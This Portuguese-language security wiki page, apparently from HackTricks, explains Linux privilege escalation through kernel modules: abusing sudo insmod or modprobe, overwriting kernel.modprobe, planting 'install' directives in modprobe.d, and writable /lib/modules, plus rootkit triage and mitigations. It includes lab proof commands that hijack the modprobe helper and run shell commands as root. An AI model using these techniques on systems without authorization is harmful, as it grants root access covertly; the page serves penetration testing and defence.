# Módulos do kernel e abuso do modprobe

{{#include ../../banners/hacktricks-training.md}}

## Configurações incorretas de módulos do kernel e carregamento de módulos

O suporte a módulos do kernel é uma área de alto impacto durante a análise de escalonamento de privilégios no Linux. Não considere toda mensagem sobre módulos não assinados como explorável por si só, mas use-a para responder a perguntas práticas.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[8]](#references)[[9]](#references)[[10]](#references)</sup>

- O usuário atual pode carregar módulos por meio de `sudo`, capabilities ou um caminho de helper gravável?
- O carregamento de módulos ainda está habilitado?
- A aplicação de assinaturas de módulos está desabilitada?
- Os diretórios de módulos, arquivos de módulos ou caminhos de configuração de `modprobe.d` podem ser gravados?<sup>[[16]](#references)</sup>
- É possível ler os logs do kernel para confirmar o que aconteceu?

A triagem rápida começa com as seguintes verificações de status dos módulos, assinaturas, logs e árvore de módulos.<sup>[[1]](#references)[[2]](#references)[[6]](#references)[[8]](#references)</sup>

```bash
uname -a
uname -r
cat /proc/sys/kernel/modules_disabled 2>/dev/null
grep -Eo '(^| )module\.sig_enforce(=[^ ]*)?' /proc/cmdline 2>/dev/null
grep -E '^(CONFIG_STATIC_USERMODEHELPER|CONFIG_STATIC_USERMODEHELPER_PATH)=' "/boot/config-$(uname -r)" 2>/dev/null
grep -E '^(CONFIG_MODULE_SIG|CONFIG_MODULE_SIG_FORCE)=' "/boot/config-$(uname -r)" 2>/dev/null
cat /proc/sys/kernel/dmesg_restrict 2>/dev/null
dmesg 2>/dev/null | grep -Ei 'module|signature|taint|verification'
find /lib/modules/$(uname -r) -type d -writable -ls 2>/dev/null
find /lib/modules/$(uname -r) -type f -name '*.ko*' -writable -ls 2>/dev/null
```

Interpretação:

- `modules_disabled=1` significa que os módulos não podem ser carregados nem descarregados, e o valor não pode ser redefinido para `0` até a reinicialização.<sup>[[1]](#references)</sup>
- `module.sig_enforce=1` na linha de comando do kernel ou `CONFIG_MODULE_SIG_FORCE=y` exige módulos assinados validamente; caso contrário, módulos não assinados podem ser carregados e marcar o kernel como contaminado.<sup>[[2]](#references)</sup>
- `dmesg_restrict=0` não impõe restrições ao `dmesg`; quando o valor é `1`, o acesso exige `CAP_SYSLOG`.<sup>[[1]](#references)</sup>
- Caminhos graváveis em `/lib/modules/$(uname -r)/` são perigosos porque o `modprobe` pesquisa essa árvore e seus dados de dependência ao carregar módulos.<sup>[[8]](#references)</sup>

### Carregar um módulo e ler a saída do kernel

Se você tiver permissão legítima para carregar um módulo local, `insmod` insere o arquivo `.ko` exato que você fornecer. A função init do módulo é executada como parte do carregamento, e as mensagens escritas com `printk()` vão para o buffer de log do kernel, que normalmente é lido com `dmesg`.<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)</sup>

Um fluxo de revisão mínimo usa `modinfo` para inspecionar os metadados, `insmod` e `rmmod` para carregar e remover um módulo, `lsmod` para confirmar o estado de carregamento e `dmesg` para inspecionar os logs do kernel.<sup>[[4]](#references)[[6]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>

```bash
ls -l ./example.ko
modinfo ./example.ko 2>/dev/null
sudo insmod ./example.ko
lsmod | grep -i example
dmesg | tail -n 30
sudo rmmod example
dmesg | tail -n 30
```

Se `sudo -l` permitir `insmod`, `modprobe` ou um wrapper em torno deles, trate isso como crítico: `sudo -l` lista os privilégios do usuário que invoca o comando, e carregar um módulo do kernel requer `CAP_SYS_MODULE`. Consulte [Linux capabilities](../interesting-files-permissions/linux-capabilities.md#cap_sys_module) para caminhos diretos baseados em capabilities.<sup>[[3]](#references)[[9]](#references)[[10]](#references)</sup>

```bash
sudo -l
sudo /sbin/insmod ./example.ko
```

### `insmod` permitido via sudo

Uma regra do sudo que permite a um usuário executar `insmod` não é comparável à permissão para executar um auxiliar administrativo comum. O código de inicialização do módulo é executado como parte da inserção; portanto, a questão prática da análise é se esse usuário pode escolher ou modificar o módulo carregado.<sup>[[3]](#references)</sup>

O fluxo genérico de análise a seguir repete essas verificações de inspeção, carregamento, estado, logs e remoção para um módulo candidato.<sup>[[4]](#references)[[6]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>

```bash
sudo -l
ls -l ./candidate.ko
modinfo ./candidate.ko 2>/dev/null
sudo /sbin/insmod ./candidate.ko
lsmod | grep -i candidate
dmesg | tail -n 30
sudo /sbin/rmmod candidate
```

Se o usuário puder fornecer um arquivo `.ko` arbitrário, a situação deve ser tratada como comprometimento total do sistema em uma avaliação autorizada. Uma prática operacional mais segura é evitar delegar o carregamento de módulos por meio do sudo; se isso for inevitável, restrinja o caminho exato, a propriedade, as permissões, a política de assinatura e o processo de remoção.<sup>[[3]](#references)[[10]](#references)</sup>

Para um padrão inofensivo de compilação de módulos em um laboratório controlado, o código-fonte mínimo e o Makefile são mostrados abaixo; o formato `make -C /lib/modules/$(uname -r)/build M=$PWD` segue o fluxo de trabalho kbuild documentado pelo kernel para módulos externos.<sup>[[5]](#references)[[7]](#references)</sup>

```c
#include <linux/module.h>
#include <linux/kernel.h>

static int __init demo_init(void) {
    printk(KERN_INFO "demo module loaded\n");
    return 0;
}

static void __exit demo_exit(void) {
    printk(KERN_INFO "demo module unloaded\n");
}

module_init(demo_init);
module_exit(demo_exit);
MODULE_LICENSE("GPL");
```

```makefile
obj-m += demo.o

all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```

Compile e carregue apenas em um laboratório autorizado; o kbuild compila o módulo externo, e os comandos de carregamento/remoção invocam as interfaces de módulos do kernel.<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[7]](#references)</sup>

```bash
make
sudo insmod demo.ko
dmesg | tail -n 20
sudo rmmod demo
```

### Verificações de abuso de `kernel.modprobe` / `modprobe_path`

`kernel.modprobe` especifica o auxiliar de espaço do usuário que o kernel executa para solicitações de carregamento automático de módulos; esse sysctl afeta o carregamento automático, não a inserção explícita de módulos. Se um atacante puder alterá-lo para um caminho executável gravável e acionar uma solicitação de módulo, esse auxiliar se torna um caminho de execução de código com privilégios. Defini-lo como uma string vazia desativa as solicitações de carregamento automático; se `CONFIG_STATIC_USERMODEHELPER=y`, um valor não vazio é substituído pelo caminho do auxiliar estático compilado no kernel.<sup>[[1]](#references)</sup>

Verifique o caminho atual do auxiliar pela interface sysctl do kernel e inspecione o proprietário e as permissões do alvo.<sup>[[1]](#references)</sup>

```bash
cat /proc/sys/kernel/modprobe 2>/dev/null
sysctl kernel.modprobe 2>/dev/null
ls -l "$(cat /proc/sys/kernel/modprobe 2>/dev/null)" 2>/dev/null
```

Verifique se o sysctl, as regras sudo delegadas ou as capacidades de arquivo podem ser influenciados.<sup>[[1]](#references)[[9]](#references)[[10]](#references)[[15]](#references)</sup>

```bash
ls -l /proc/sys/kernel/modprobe
sudo -l | grep -E 'sysctl|tee|bash|sh|modprobe'
getcap -r / 2>/dev/null | grep -E 'cap_sys_admin|cap_sys_module'
```

O padrão a seguir, destinado apenas a laboratório, altera o caminho do helper e aciona uma solicitação documentada de carregamento automático de módulo; use-o somente em um sistema isolado e autorizado.<sup>[[1]](#references)</sup>

Em kernels Linux atuais, não use um executável desconhecido como gatilho genérico: o carregamento automático de módulos para formatos binários personalizados legados foi removido no Linux 6.14, enquanto a documentação do kernel identifica um tipo de sistema de arquivos desconhecido como um caminho para solicitar o carregamento automático de um módulo.<sup>[[1]](#references)[[11]](#references)</sup>

```bash
# Example only: requires permission to write kernel.modprobe
printf '#!/bin/sh\nid > /tmp/modprobe-helper-ran\n' > /tmp/helper
chmod +x /tmp/helper
echo /tmp/helper | sudo tee /proc/sys/kernel/modprobe

# Trigger a documented module-autoload request (requires mount privilege)
sudo mount -t definitely-not-a-filesystem none /mnt 2>/dev/null || true
cat /tmp/modprobe-helper-ran 2>/dev/null
```

Em sistemas com hardening, isso deve falhar quando as permissões impedirem gravações sem privilégios em `kernel.modprobe`, o caminho do helper não for gravável ou o carregamento automático de módulos estiver desativado.<sup>[[1]](#references)</sup>

### Configuração gravável de `modprobe.d` e `sudo modprobe -C`

Antes de resolver um módulo, `modprobe` lê arquivos `.conf` de diretórios de configuração como `/etc/modprobe.d`, `/run/modprobe.d`, `/usr/local/lib/modprobe.d`, `/usr/lib/modprobe.d` e `/lib/modprobe.d`, em ordem de precedência. Um arquivo com o mesmo nome em um diretório de prioridade maior substitui o arquivo de prioridade menor. Mais importante: uma diretiva `install <module> <command>` executa um comando shell arbitrário **em vez de** inserir esse módulo. Portanto, um caminho de configuração gravável pode permitir a execução retardada de comandos com as credenciais de um usuário que execute `modprobe` posteriormente com privilégios; a aplicação de assinaturas de módulos do kernel não autentica esse comando em espaço de usuário.<sup>[[16]](#references)</sup>

Audite as permissões de diretórios e arquivos e, em seguida, inspecione a configuração efetiva. `modprobe -n -v` é seguro para revisar a resolução, pois o modo de simulação não insere o módulo nem executa um comando `install`/`remove`. Prefira `modprobe -c` à forma legada `--showconfig`, que a documentação atual do kmod indica que será removida após o kmod 36.<sup>[[8]](#references)[[16]](#references)</sup>

```bash
for d in /etc/modprobe.d /run/modprobe.d /usr/local/lib/modprobe.d /usr/lib/modprobe.d /lib/modprobe.d; do
    [ -e "$d" ] || continue
    find "$d" -maxdepth 1 -writable -ls 2>/dev/null
done

grep -RHE '^[[:space:]]*(install|remove|alias|blacklist)[[:space:]]' \
  /etc/modprobe.d /run/modprobe.d /usr/local/lib/modprobe.d \
  /usr/lib/modprobe.d /lib/modprobe.d 2>/dev/null
modprobe -c 2>/dev/null | grep -E '^(install|remove|alias|blacklist)[[:space:]]'
modprobe -n -v <module_name>
```

Uma regra irrestrita do sudo para `modprobe` é explorável mesmo quando arquivos `.ko` arbitrários não passam pela verificação de assinatura: `-C` seleciona um diretório de configuração controlado pelo invasor, de onde um comando `install` pode ser executado pelo processo iniciado pelo sudo.<sup>[[8]](#references)[[16]](#references)</sup>

```bash
# Authorized lab proof for an unrestricted `sudo modprobe` rule
D="$(mktemp -d)"
printf '%s\n' 'install ht_probe /bin/sh -c "id > /tmp/ht-modprobe-id"' > "$D/00-ht.conf"
sudo /sbin/modprobe -C "$D" ht_probe
cat /tmp/ht-modprobe-id
```

Para mitigar, não conceda acesso ao `modprobe` sem restrições de argumentos por meio do sudo, mantenha todos os diretórios de configuração pertencentes ao root e sem permissão de escrita, e revise diretivas `install`/`remove` inesperadas. Quando um fluxo administrativo confiável precisar ignorar essas diretivas para um módulo, `modprobe --ignore-install` as ignora para o módulo especificado, mas as dependências ainda podem ter seus próprios comandos.<sup>[[8]](#references)[[16]](#references)</sup>

### Revisão de `/lib/modules` com permissão de escrita

Diretórios de módulos com permissão de escrita podem permitir a substituição de módulos, a instalação de módulos maliciosos ou o abuso do carregamento automático, dependendo de como `modprobe` for invocado posteriormente; `modprobe` pesquisa `/lib/modules/$(uname -r)` e usa os dados de dependência ao resolver módulos.<sup>[[8]](#references)</sup>

Revise os arquivos de módulos com permissão de escrita e os metadados de dependências/aliases na árvore de módulos da versão ativa do kernel.<sup>[[8]](#references)</sup>

```bash
KREL="$(uname -r)"
find "/lib/modules/$KREL" -type d -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f -name '*.ko*' -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f \( -name 'modules.dep' -o -name 'modules.alias' -o -name 'modules.order' \) -writable -ls 2>/dev/null
```

Se encontrar conteúdo de módulo gravável, inspecione como modprobe resolve dependências e como modinfo relata os metadados do módulo.<sup>[[8]](#references)[[12]](#references)</sup>

```bash
modprobe --show-depends <module_name> 2>/dev/null
modinfo <module_name> 2>/dev/null
grep -R "<module_name>" /lib/modules/$(uname -r)/modules.* 2>/dev/null
```

Notas defensivas:

- Mantenha `/lib/modules` pertencente a `root:root` e sem permissão de escrita para usuários.<sup>[[8]](#references)</sup>
- Defina `kernel.modules_disabled=1` após a inicialização, quando isso for operacionalmente possível.<sup>[[1]](#references)</sup>
- Aplique a assinatura de módulos em sistemas que exigem módulos carregáveis.<sup>[[2]](#references)</sup>
- Monitore gravações em `/proc/sys/kernel/modprobe`, `/lib/modules` e nos diretórios de configuração `modprobe.d`, além de execuções inesperadas de `insmod`/`modprobe`.<sup>[[1]](#references)[[8]](#references)[[16]](#references)</sup>



## Triagem de rootkit baseado em módulos

Um módulo malicioso pode interceptar syscalls, visualizações de VFS ou `/proc`, caminhos de rede ou verificações de credenciais para ocultar processos e arquivos, redirecionar tráfego ou interceptar segredos. Também pode remover a si próprio da lista de módulos exibida por `lsmod`. A persistência pode vir de aliases ou regras `install` em `modprobe.d`, de `/etc/modules-load.d`, de uma unidade do systemd, do conteúdo do initramfs ou da substituição de um arquivo `.ko` legítimo. Um resultado normal de `lsmod` é uma evidência útil, mas um comprometimento no nível do kernel pode tornar pouco confiáveis as listas fornecidas pelo kernel. Correlacione os módulos carregados, os arquivos em disco, a configuração de inicialização, os logs de carregamento de módulos e a telemetria externa confiável.

```bash
cat /proc/modules
lsmod
find /lib/modules/"$(uname -r)" -type f -name '*.ko*' -ls 2>/dev/null
grep -R -nE '^(install|softdep|blacklist|options) ' /etc/modprobe.d /run/modprobe.d /usr/lib/modprobe.d 2>/dev/null
find /etc/modules-load.d /usr/lib/modules-load.d -maxdepth 1 -type f -print 2>/dev/null
journalctl -k -b | grep -Ei 'module|taint|signature|lockdown'
cat /proc/sys/kernel/tainted
```

Revise nomes inesperados de módulos, caminhos, dependências, assinaturas e tempos de carregamento. Mensagens sobre taint do kernel e módulos sem assinatura são indícios, não provas da presença de um rootkit. Se houver suspeita de rootkit, colete evidências usando uma imagem confiável ou um ambiente de recuperação antes de confiar na saída do kernel em execução. A página [avaliação de vulnerabilidades do kernel](kernel-vulnerability-assessment.md) aborda a exposição de configurações e diagnósticos, incluindo tracefs e objetos BPF fixados.

## References

- [1] [Documentação de /proc/sys/kernel/ — documentação do Linux Kernel](https://docs.kernel.org/admin-guide/sysctl/kernel.html)
- [2] [Recurso de assinatura de módulos do kernel — documentação do Linux Kernel](https://www.kernel.org/doc/html/latest/admin-guide/module-signing.html)
- [3] [init_module(2) — página do manual do Linux](https://man7.org/linux/man-pages/man2/init_module.2.html)
- [4] [insmod(8) — página do manual do Linux](https://man7.org/linux/man-pages/man8/insmod.8.html)
- [5] [Fundamentos de drivers — documentação do Linux Kernel](https://docs.kernel.org/driver-api/basics.html)
- [6] [Registro de mensagens com printk — documentação do Linux Kernel](https://docs.kernel.org/core-api/printk-basics.html)
- [7] [Compilação de módulos externos — documentação do Linux Kernel](https://docs.kernel.org/kbuild/modules.html)
- [8] [modprobe(8) — página do manual do Linux](https://man7.org/linux/man-pages/man8/modprobe.8.html)
- [9] [sudo(8) — página do manual do Linux](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [10] [capabilities(7) — página do manual do Linux](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [11] [Mesclar tag 'execve-v6.14-rc1' — torvalds/linux](https://github.com/torvalds/linux/commit/fadc3ed9ce1cd9ecc5c8be8875f7ec11ab3a7ebe)
- [12] [modinfo(8) — página do manual do Linux](https://man7.org/linux/man-pages/man8/modinfo.8.html)
- [13] [lsmod(8) — página do manual do Linux](https://man7.org/linux/man-pages/man8/lsmod.8.html)
- [14] [rmmod(8) — página do manual do Linux](https://man7.org/linux/man-pages/man8/rmmod.8.html)
- [15] [getcap(8) — página do manual do Linux](https://man7.org/linux/man-pages/man8/getcap.8.html)
- [16] [modprobe.d(5) — página do manual do Linux](https://man7.org/linux/man-pages/man5/modprobe.d.5.html)
{{#include ../../banners/hacktricks-training.md}}
